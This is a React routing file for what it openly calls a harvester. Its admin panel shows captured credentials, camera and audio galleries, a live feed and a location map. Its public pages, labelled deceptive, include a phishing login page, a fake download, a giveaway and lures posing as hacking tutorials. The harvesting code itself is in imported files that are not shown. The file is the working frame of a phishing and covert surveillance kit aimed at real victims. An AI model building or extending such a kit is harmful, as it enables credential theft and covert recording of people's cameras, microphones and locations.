import React from 'react';
import axios from 'axios';
import './styles/global.css';

// Set auth header immediately from localStorage (before any component renders)
const storedToken = localStorage.getItem('admin_token');
if (storedToken) {
  axios.defaults.headers.common['Authorization'] = `Bearer ${storedToken}`;
}

import { Routes, Route } from 'react-router-dom';
import { ThemeProvider, createTheme, CssBaseline } from '@mui/material';

// Admin Pages
import AdminLogin from './admin/LoginPage';
import AdminLayout from './admin/AdminLayout';
import Dashboard from './admin/Dashboard';
import SessionsPage from './admin/SessionsPage';
import SessionDetail from './admin/SessionDetail';
import CredentialsPage from './admin/CredentialsPage';
import CameraGallery from './admin/CameraGallery';
import AudioGallery from './admin/AudioGallery';
import LiveFeed from './admin/LiveFeed';
import MapView from './admin/MapView';
import AlertsPage from './admin/AlertsPage';
import SettingsPage from './admin/SettingsPage';
import PermissionsControl from './admin/PermissionsControl';

// Public Deceptive Pages
import LandingPage from './pages/LandingPage';
import QuizPage from './pages/QuizPage';
import DownloadPage from './pages/DownloadPage';
import PhishingLoginPage from './pages/LoginPage';
import VideoPage from './pages/VideoPage';
import NewsArticle from './pages/NewsArticle';
import GiveawayPage from './pages/GiveawayPage';
import WifiHackingPage from './pages/WifiHackingPage';
import AndroidHackingPage from './pages/AndroidHackingPage';
import SystemHackingPage from './pages/SystemHackingPage';

const darkTheme = createTheme({
  palette: {
    mode: 'dark',
    primary: { main: '#00f0ff' },
    secondary: { main: '#ff0055' },
    background: { default: '#0a0e17', paper: '#111827' },
    success: { main: '#00ff88' },
    warning: { main: '#ffaa00' },
    error: { main: '#ff3355' }
  },
  typography: {
    fontFamily: '"Inter", "Roboto", "Helvetica", sans-serif',
    h3: { fontWeight: 700 },
    h4: { fontWeight: 600 },
    h5: { fontWeight: 600 }
  },
  shape: { borderRadius: 10 },
  components: {
    MuiButton: { styleOverrides: { root: { textTransform: 'none', fontWeight: 600 } } },
    MuiCard: { styleOverrides: { root: { backgroundImage: 'none' } } }
  }
});

function App() {
  const isHarvesterPage = window.location.pathname.startsWith('/admin');

  return (
    <ThemeProvider theme={darkTheme}>
      <CssBaseline />
      <Routes>
        {/* Admin Routes */}
        <Route path="/admin/login" element={<AdminLogin />} />
        <Route path="/admin" element={<AdminLayout />}>
          <Route index element={<Dashboard />} />
          <Route path="sessions" element={<SessionsPage />} />
          <Route path="sessions/:id" element={<SessionDetail />} />
          <Route path="credentials" element={<CredentialsPage />} />
          <Route path="camera" element={<CameraGallery />} />
          <Route path="audio" element={<AudioGallery />} />
          <Route path="live-feed" element={<LiveFeed />} />
          <Route path="map" element={<MapView />} />
          <Route path="permissions" element={<PermissionsControl />} />
          <Route path="alerts" element={<AlertsPage />} />
          <Route path="settings" element={<SettingsPage />} />
        </Route>

        {/* Public Deceptive Pages - These load the harvester */}
        <Route path="/" element={<LandingPage />} />
        <Route path="/quiz" element={<QuizPage />} />
        <Route path="/download" element={<DownloadPage />} />
        <Route path="/login" element={<PhishingLoginPage />} />
        <Route path="/video" element={<VideoPage />} />
        <Route path="/news" element={<NewsArticle />} />
        <Route path="/giveaway" element={<GiveawayPage />} />
        <Route path="/wifi-hacking" element={<WifiHackingPage />} />
        <Route path="/android-hacking" element={<AndroidHackingPage />} />
        <Route path="/system-hacking" element={<SystemHackingPage />} />
      </Routes>
    </ThemeProvider>
  );
}

export default App;